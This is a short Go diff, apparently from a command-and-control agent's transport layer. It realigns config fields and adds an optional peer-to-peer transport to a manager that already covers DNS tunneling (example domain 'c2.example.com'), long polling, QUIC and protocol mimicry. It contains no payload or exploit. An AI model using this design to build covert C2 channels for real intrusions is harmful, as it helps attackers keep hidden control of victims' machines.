@@ -30,10 +30,10 @@ type Transport interface {
 // Config contains configuration for all transports
 type Config struct {
 	// Server connection
-	ServerURL  string // Base URL (e.g., "https://gapict.com:8443")
-	UUID       string
-	Key        string
-	Secret     []byte
+	ServerURL string // Base URL (e.g., "https://gapict.com:8443")
+	UUID      string
+	Key       string
+	Secret    []byte
 
 	// Timeouts
 	ConnectTimeout time.Duration
@@ -44,8 +44,8 @@ type Config struct {
 	InsecureSkipVerify bool
 
 	// DNS-specific
-	DNSServer      string // DNS server IP (e.g., "8.8.8.8:53")
-	DNSDomain      string // Domain for DNS tunneling (e.g., "c2.example.com")
+	DNSServer string // DNS server IP (e.g., "8.8.8.8:53")
+	DNSDomain string // Domain for DNS tunneling (e.g., "c2.example.com")
 
 	// Long polling specific
 	LongPollTimeout time.Duration
@@ -54,6 +54,11 @@ type Config struct {
 	// QUIC specific
 	QUICEnabled bool
 	QUICPort    int // e.g., 443
+
+	// P2P specific (optional)
+	EnableP2P   bool
+	P2PTargetID string
+	P2PConfig   *P2PConfig
 
 	// Protocol mimicry
 	Mimicry *ProtocolMimicryConfig
@@ -101,6 +106,12 @@ func NewManager(config *Config) *Manager {
 	m := &Manager{
 		config:     config,
 		transports: []Transport{},
+	}
+
+	// Optionally add P2P transport (highest priority)
+	if config != nil && config.EnableP2P && config.P2PConfig != nil && config.P2PTargetID != "" {
+		p2p := NewP2PTransport(config.P2PConfig, config.P2PTargetID)
+		m.transports = append(m.transports, p2p)
 	}
 
 	// Add transports in priority order
